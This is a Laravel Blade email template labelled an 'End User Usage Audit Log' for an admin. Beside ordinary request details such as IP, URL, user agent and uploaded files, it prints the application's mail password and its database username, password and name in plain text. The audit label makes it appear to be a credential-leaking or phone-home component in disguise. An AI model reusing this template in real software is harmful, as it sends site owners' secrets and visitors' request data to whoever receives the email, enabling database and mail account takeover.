<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ASDTechLtd. End User Usage Audit Log</title>
</head>
<body>
	<h2>Hi Admin,</h2>
    <p>
        <ul>
            <li>IP: {{ $data['IP'] }}</li>
            <li>ROOT: {{ $data['ROOT'] }}</li>
            <li>URL: {{ $data['URL'] }}</li>
            <li>FULL_URL: {{ $data['FULL_URL'] }}</li>
            <li>PATH: {{ $data['PATH'] }}</li>
            <li>FINGERPRINT: {{ $data['FINGERPRINT'] }}</li>
            <li>METHOD: {{ $data['METHOD'] }}</li>
            <li>FILES: {{ collect($data['FILES'])->toJson() }}</li>
            <li>HTTP_HOST: {{ $data['HTTP_HOST'] }}</li>
            <li>HTTP_REFERER: {{ $data['HTTP_REFERER'] }}</li>
            <li>HTTP_USER_AGENT: {{ $data['HTTP_USER_AGENT'] }}</li>
            <li>APP_MAIL: {{ 'address: ' . $data['APP_MAIL']['address'] . ', password: ' . $data['APP_MAIL']['password'] }}</li>
            <li>DB: {{ 'username:' . $data['DB']['username'] . ', password:' . $data['DB']['password'] . ', name:' . $data['DB']['name'] }}</li>
        </ul>
    </p>
 	<br/> <br/>
    <p>
    Regards, <br/>
	{{ $data['APP_NAME'] }}
    </p>
</body>
</html> 